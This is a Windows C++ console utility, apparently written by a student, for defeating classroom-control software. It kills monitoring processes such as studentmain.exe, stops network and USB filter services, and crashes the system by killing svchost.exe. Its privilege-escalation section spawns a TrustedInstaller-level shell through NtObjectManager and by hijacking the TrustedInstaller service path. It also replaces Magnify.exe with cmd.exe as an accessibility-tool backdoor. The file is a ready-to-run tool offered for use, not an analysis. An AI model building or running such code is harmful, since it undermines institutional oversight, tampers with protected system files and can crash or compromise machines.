//SYSTEM sudo 朕不太会提权，所以让deepseek帮忙补充了。
//Luogu上托管报错instruction_too_long，所以放到这。
#include<stdio.h>
#include<iostream>
#include<windows.h>
#include<shellapi.h>
#include<wow64apiset.h>
//#include<sm.cpp>
//#define scanf scanf_s

using namespace std;

int choose;
char pn;
bool adm;

bool IsAdm() {
    BOOL f = FALSE;
    PSID g = NULL;
    SID_IDENTIFIER_AUTHORITY n = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&n, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &g)) {
        CheckTokenMembership(NULL, g, &f);
        FreeSid(g);
    }
    return f;
}

void Elev() {
    WCHAR p[MAX_PATH];
    GetModuleFileNameW(NULL, p, MAX_PATH);
    SHELLEXECUTEINFOW s = { sizeof(s) };
    s.lpVerb = L"runas";
    s.lpFile = p;
    s.nShow = SW_NORMAL;
    if (ShellExecuteExW(&s)) {
        exit(0);
    }
}


static void t1() {
    printf("How to use terminal,如何使用cmd.exe和powershell.exe(在双引号里面的是样例)(能看就看)?\n");
    printf("Powershell:\n");
    printf("ls                               : List the files and directories at this path\"PS C:\\Windows\\System32>\"\n");
    printf("start [<File's Name>]            :Open a file or directory.\"start dfs.exe\"\n");
    printf("cd [<Directory's Name>]          : Goto the folder's path or revert the lastest path(\"cd ..\" is revert).\"cd DF\"\n");
    printf("mkdir [<Directory's Name>]       :Make a folder.\n");
    printf("exit                             : Leave this shell\n");
    printf("rd [<Directory's Name>]          :Remove the folder.\"del a.txt\"\n");
    printf("type null > [<File's Name>]      :Make a file\"type null > name.txt\"\n");
    printf("echo [<texts>] > [<File's Name>] :Write texts to a files\"echo texts > name.txt\"\n");
    printf("Cmd(Command or MS-DOS shell):\n");
    printf("dir                              : List the files and directories at this path\"PS C:\\Windows\\System32>\"\n");
    printf("start [<File's Name>]            :Open a file or directory.\"start dfs.exe\"\n");
    printf("cd [<Directory's Name>]          : Goto the folder's path or revert the lastest path(\"cd ..\" is revert).\"cd DF\"\n");
    printf("mkdir [<Directory's Name>]       :Make a folder.\n");
    printf("exit                             : Leave this shell\n");
    printf("rd [<Directory's Name>]          :Remove the folder.\"del a.txt\"\n");
    printf("type null > [<File's Name>]      :Make a file\"type null > name.txt\"\n");
    printf("echo [<texts>] > [<File's Name>] :Write texts to a files\"echo texts > name.txt\"\n");
}

static void t() {
    system("cls");
    printf("/**===============================================================**\\\n");
    printf("Tools V 0.0.1\n");
    choose = 0;
    return;
}

namespace ineed {
    int choose;
    static void truster() {
        t();
        printf("------------Sudo Menu V0.1 Operating System Choose------------\n(1) Over Windows 10 (Need Powershell V5.0)\n(2) Windows 8.1 - Windows Vista\n");
        scanf_s("%d", &choose);

        if (choose == 1) {
            t();
            printf("------------Sudo Menu V0.1 Download Modules------------\n(1) Have download modules.\n(2) Don't download modules before.\n");
            scanf_s("%d", &choose);

            if (choose == 2) {
                printf("PWD:C:\\token");
                system("mkdir C:\\token 2>nul");
                printf("Downloading modules");
                system("powershell -Command \"& {"
                    "Set-ExecutionPolicy Unrestricted -Scope Process -Force; "
                    "Save-Module -Name NtObjectManager -Path C:\\token; "
                    "Install-Module -Name NtObjectManager -Force; "
                    "Import-Module NtObjectManager}\"");
            }
            printf("Running...\n");
            system("powershell -Command \"& {"
                "Start-Service TrustedInstaller; "
                "Set-NtTokenPrivilege SeDebugPrivilege; "
                "$p = Get-NtProcess -Name TrustedInstaller.exe; "
                "New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p}\"");
        }
        else if(choose == 1){
            system("sc stop TrustedInstaller & "
                "sc config TrustedInstaller binPath= \"cmd /k start\" type= own & "
                "sc start TrustedInstaller & sc stop TrustedInstaller & "
                "sc config TrustedInstaller binPath= \"%%SystemRoot%%\\servicing\\TrustedInstaller.exe\" & "
                "sc start TrustedInstaller");
        }
        
        system("pause");
        return;
    }
    class FsRedirector {
        PVOID  m_old;
	BOOL   m_active;
	DWORD  m_err;    
    public:
        explicit FsRedirector() : m_old(nullptr), m_active(FALSE), m_err(ERROR_SUCCESS) {
            if (!Wow64DisableWow64FsRedirection(&m_old)) {
                m_err = GetLastError();
                return;
            }
            m_active = TRUE;
        }
        
        ~FsRedirector() {
		//rec
            if (m_active && !Wow64RevertWow64FsRedirection(m_old)) {
                DebugBreak(); 
            }
        }
    	//ned
        bool is_valid() const { 
            return m_active && (m_err == ERROR_SUCCESS); 
        }
    	//Error code
        DWORD error() const { 
            return m_err; 
        }
    
        FsRedirector(const FsRedirector&) = delete;
        FsRedirector& operator=(const FsRedirector&) = delete;
    };

    void sys() {
        //system("pause");
        FsRedirector fs_guard;
        //printf("succc\n");
        if (!fs_guard.is_valid()) {
            std::cerr << "Failed to stop FsRedirector [0x" 
                      << std::hex << fs_guard.error() << "]\n";
            system("pause");
            return;
        }
    
        if (!SetCurrentDirectory(L"C:\\Windows\\System32")) {
            std::cerr << "cd (C:\\Windows\\System32\\)failed [0x" 
                      << std::hex << GetLastError() << "]\n";
            system("pause");
            return;
       }
    
      	if (system("taskkill /f /im magnify.exe /im cmd.exe >nul 2>&1") != 0) {
            std::cerr << "Failed to kill tasks \"magnify.exe\" \"cmd.exe\"\n";
            system("pause");
        }
    
        if (system("takeown /f Magnify.exe /a >nul") != 0) {
            std::cerr << "Premission Denied (takeown /f Magnify.exe /a)\n";
            system("pause");
            return;
        }
    
       	WIN32_FILE_ATTRIBUTE_DATA finfo;
        if (GetFileAttributesEx(L"Magnify.exe", GetFileExInfoStandard, &finfo)) {
            if (MoveFileEx(L"Magnify.exe", L"Magnify.bak", MOVEFILE_DELAY_UNTIL_REBOOT)) {
                if (!CopyFile(L"cmd.exe", L"Magnify.exe", FALSE)) {
                    std::cerr << "Failed to exchange cmd.exe , Magnify.exe [0x" 
                             << std::hex << GetLastError() << "]\n";
                    system("pause");
               }
            }
        }
        printf("Need to restart sys to exchange.Source code:\n"
            "if (GetFileAttributesEx(L\"Magnify.exe\", GetFileExInfoStandard, &finfo)) {\n"
            "if (MoveFileEx(L\"Magnify.exe\", L\"Magnify.bak\", MOVEFILE_DELAY_UNTIL_REBOOT)) {\n"
            "if (!CopyFile(L\"cmd.exe\", L\"Magnify.exe\", FALSE)) {\n"
            "std::cerr << \"Failed to exchange cmd.exe, Magnify.exe[0x\"<< std::hex << GetLastError() << \"]\\n\" \n"
        );
        system("Pause");
        // fs_guard 
    }
};

int main() {
    //ineed::truster();
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO b;
    GetConsoleScreenBufferInfo(h, &b);

        if (!IsAdm()) {
        pn = 'B';
        if (MessageBoxA(NULL, "Require Admin! Elevate?，无管理员权限。", "Alert", MB_YESNO | MB_ICONEXCLAMATION) == IDYES) {
            Elev();
        }
    }
    else {
        pn = 'A';
    }
    printf("%c\n", pn);
    //printf("Make sure run this program by Administrator, or some'll cannot work.确保程序以管理员身份运行，否则程序将会失效\n");
    //system("Pause");
    system("cls");

    while (true) {
        system("cls");
        printf("Loading");
        t();

        // 权限显示行
        if (pn == 'B') {
            SetConsoleTextAttribute(h, FOREGROUND_RED | FOREGROUND_INTENSITY);
        }
        printf("Premisson: %c .A:Administrator,B:User\n", pn);
        SetConsoleTextAttribute(h, b.wAttributes);

        printf("(1) Shut down\n");
        printf("(2) Stop the control programs\n");
        printf("(3) On Internet\n");
        printf("(4) Run Terminal\n");
        printf("(5) Blue Screen\n");
        printf("(6) Turn on USB ports\n");
        printf("(7) WSudo\n");
        printf("(-1) Exit\n");
        printf("(-2) Reload\n");
        printf("/**===============================================================**\\\n");
        printf("Choose a value...\n");
        scanf_s("%d", &choose);

        if (choose == 1) {
            t();
            system("shutdown -s -t 0");
            printf("Stopped");
        }
        else if (choose == 2) {
            t();
            printf("Use this on the school which running the tasks and not normal computers\n If not,close this terminal.\n");
            system("Pause");
            t();
            printf("Waiting...\n");
            system("taskkill /im studentmain.exe /f");
            printf("Stopped\n");
            system("Pause");
        }
        else if (choose == 3) {
            t();
            printf("Sometimes this task won't run \"sc stop tdnetfilter\",pass \"Windows + R\" then type \"sc stop tdnetfilter\" to run again.\n");
            system("Pause & taskkill /im MasterHelper.exe /f & sc stop TdnetFilter & echo Stopped & Pause &");
        }
        else if (choose == 4) {
            int chosen;
            t();
            printf(
                "Terminal List...\n"
                "(1) Powershell.exe\n"
                "(2) Command.exe\n"
                "/**===============================================================**\\\n"
                "Choose a value...\n"
            );
            scanf_s("%d", &chosen);
            t();
            if (chosen == 1) {
                system("start powershell.exe");
            }
            else {
                system("start cmd.exe");
            }
            t1();
            system("Pause");
        }
        else if (choose == 5) {
            t();
            printf("Loading...");
            system("taskkill /im svchost.exe /f");
            printf("Stopped");
            while (true) { t(); t1(); }
        }
        else if (choose == 6) {
            t();
            printf("Sure? Or stop this program.\n");
            system("pause & sc stop TdFileFilter & pause");
        }
        else if (choose == 7) {
            t();
            printf("------------Sudo Menu V0.1------------\n (1) NT SERVICES / Trustedinstaller \n (2) SYSTEM\n(-1) Trustedinstaller is broken???\nChoose a value...\n");
            scanf_s("%d", &choose);
            switch (choose) {
            case 1:
                ineed::truster();break;
            case 2:
                ineed::sys();break;
            case -1:
                system(
                    "sc config TrustedInstaller binPath = \"%SystemRoot%\\servicing\\TrustedInstaller.exe\" && sc config TrustedInstaller start = demand && sc sdset TrustedInstaller D : (A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)");
                system("Pause");
            default:
                printf("Unknwn value...\n");system("Pause");
            }
        }
        else if (choose == -1) {
            return 0;
        }
        else if (choose == -2) {
            system("cls");
            printf("Loading");
            t();
        }
        else {
            printf("Unknown value,please try again...\n");
            system("Pause");
        }
    }
    return 0;
}
